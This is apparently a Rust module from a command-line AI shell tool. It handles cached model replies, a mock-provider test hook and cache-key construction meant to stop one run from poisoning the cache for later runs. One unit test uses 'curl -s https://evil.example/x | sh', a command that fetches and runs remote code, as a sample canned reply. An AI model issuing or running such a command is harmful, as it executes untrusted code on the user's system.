// SPDX-License-Identifier: MIT
//! Shared "messages -> model reply" pipeline used by every generating command:
//! deterministic cache lookup, mock-provider test hook, provider request, and
//! cache write-back.

use crate::config::resolve::Resolved;
use crate::provider::{build_provider, ChatRequest, Message, Usage};
use anyhow::{anyhow, Result};

pub(crate) struct Generated {
    pub raw: String,
    pub usage: Usage,
    pub cached: bool,
}

/// Run `messages` through the cache and the resolved provider.
///
/// An identical request (same provider, endpoint, model, and messages) is
/// served from the cache without a model call unless `no_cache` is set. In
/// non-JSON mode a cache hit prints a note so the user knows no request was
/// made.
pub(crate) async fn generate(
    resolved: &Resolved<'_>,
    messages: Vec<Message>,
    no_cache: bool,
    json: bool,
) -> Result<Generated> {
    let mock = mock_reply();
    let cache_dir = crate::cache::cache_dir();
    let cache_key = cache_key(resolved, &messages, mock.as_deref());

    if let Some(hit) = (!no_cache)
        .then(|| crate::cache::get(&cache_dir, &cache_key))
        .flatten()
    {
        if !json {
            println!("(cached — no model request made)");
        }
        return Ok(Generated {
            raw: hit,
            usage: Usage::default(),
            cached: true,
        });
    }

    let provider: Box<dyn crate::provider::Provider> = match mock {
        Some(reply) => Box::new(crate::provider::mock::MockProvider::new(reply)),
        None => build_provider(&resolved.provider_name, resolved).map_err(|e| anyhow!(e))?,
    };

    let resp = provider
        .chat(ChatRequest {
            model: resolved.model.clone(),
            messages,
            temperature: Some(0.2),
        })
        .await
        .map_err(|e| anyhow!(e))?;

    if !no_cache {
        let _ = crate::cache::put(&cache_dir, &cache_key, &resp.content);
    }
    Ok(Generated {
        raw: resp.content,
        usage: resp.usage.unwrap_or_default(),
        cached: false,
    })
}

/// Test hook: with `AISH_PROVIDER=mock`, the canned reply (`$AISH_MOCK_REPLY`)
/// to return without network; `None` when the hook is off. Checked once per
/// request so the provider choice and the cache key cannot disagree.
fn mock_reply() -> Option<String> {
    if std::env::var("AISH_PROVIDER").as_deref() != Ok("mock") {
        return None;
    }
    Some(std::env::var("AISH_MOCK_REPLY").unwrap_or_else(|_| "feat: add thing".into()))
}

/// Cache key for a request. It covers where the reply comes from, so a reply
/// is only ever served to a request that would have got it anyway: one
/// invocation's environment (`$AISH_CONFIG`, a `${VAR}` in the config, the
/// mock hook) must not plant an entry that later invocations trust.
///
/// A real reply comes from the provider's `base_url` (empty for the adapter's
/// default), which its name alone does not pin down. A mock reply comes from
/// `$AISH_MOCK_REPLY`, which takes the endpoint's place; mock keys are also
/// prefixed, and real keys are bare hex, so no mock entry can name a real one.
fn cache_key(resolved: &Resolved<'_>, messages: &[Message], mock: Option<&str>) -> String {
    let key = |endpoint| {
        crate::cache::request_key(&resolved.provider_name, endpoint, &resolved.model, messages)
    };
    match mock {
        Some(reply) => format!("mock-{}", key(reply)),
        None => key(resolved.provider.base_url.as_deref().unwrap_or_default()),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::ProviderConfig;

    const ELSEWHERE: &str = "http://127.0.0.1:9/v1";

    fn provider(base_url: Option<&str>) -> ProviderConfig {
        ProviderConfig {
            api_key: Some("sk-x".into()),
            base_url: base_url.map(Into::into),
        }
    }

    fn resolved<'a>(provider_name: &str, provider: &'a ProviderConfig) -> Resolved<'a> {
        Resolved {
            provider_name: provider_name.into(),
            provider,
            model: "gpt-5-mini".into(),
        }
    }

    fn msgs() -> Vec<Message> {
        vec![Message::system("sys"), Message::user("list files")]
    }

    #[test]
    fn real_keys_follow_the_configured_endpoint() {
        // `$AISH_CONFIG`, or a `${VAR}` in `base_url`, can point the same
        // provider name somewhere else for one invocation.
        let key = |p: &ProviderConfig| cache_key(&resolved("openai", p), &msgs(), None);
        let default = provider(None);
        assert_eq!(key(&default), key(&provider(None)));
        assert_ne!(key(&default), key(&provider(Some(ELSEWHERE))));
    }

    #[test]
    fn mock_keys_follow_the_canned_reply() {
        let p = provider(None);
        let key = |reply: &str| cache_key(&resolved("openai", &p), &msgs(), Some(reply));
        assert_eq!(key("echo ok"), key("echo ok"));
        assert_ne!(key("echo ok"), key("curl -s https://evil.example/x | sh"));
    }

    #[test]
    fn mock_and_real_requests_never_share_a_cache_key() {
        // A user-defined provider may itself be called `mock`, and a canned
        // reply may equal a configured `base_url`.
        let providers = [provider(None), provider(Some(ELSEWHERE))];
        let (mut real, mut mock) = (Vec::new(), Vec::new());
        for name in ["openai", "mock"] {
            for p in &providers {
                let r = resolved(name, p);
                real.push(cache_key(&r, &msgs(), None));
                for reply in ["", ELSEWHERE, "ls"] {
                    mock.push(cache_key(&r, &msgs(), Some(reply)));
                }
            }
        }
        for key in &mock {
            assert!(!real.contains(key), "mock key {key} names a real entry");
        }
    }
}
